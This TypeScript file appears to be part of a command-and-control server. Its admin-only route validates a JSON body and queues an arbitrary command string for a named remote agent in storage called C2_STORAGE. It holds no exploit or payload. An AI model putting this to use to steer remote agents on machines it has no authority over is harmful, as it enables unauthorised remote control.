import { requireAdmin } from "../core/auth"
import { json, error } from "../core/response"
import { getCommand, createCommand } from "../storage/commands"

export async function issueCommand(
  request: Request,
  env: Env
): Promise<Response> {

  const authError = requireAdmin(request, env)
  if (authError) return authError

  if (request.method !== "POST") {
    return error("Method Not Allowed", 405)
  }

  let body: { agentId?: string; command?: string }

  try {
    body = await request.json()
  } catch {
    return error("Invalid JSON", 400)
  }

  if (
    !body.agentId ||
    typeof body.agentId !== "string" ||
    !body.command ||
    typeof body.command !== "string"
  ) {
    return error("Invalid payload", 400)
  }

  const existing = await getCommand(env.C2_STORAGE, body.agentId)
  if (existing) {
    return error(
      "Agent already has a pending command",
      409
    )
  }

  const cmd = {
    id: crypto.randomUUID(), // ✅ Web Crypto
    agentId: body.agentId,
    command: body.command,
    createdAt: new Date().toISOString(),
    status: "queued" as const
  }

  await createCommand(env.C2_STORAGE, cmd)

  return json({
    ok: true,
    commandId: cmd.id
  })
}
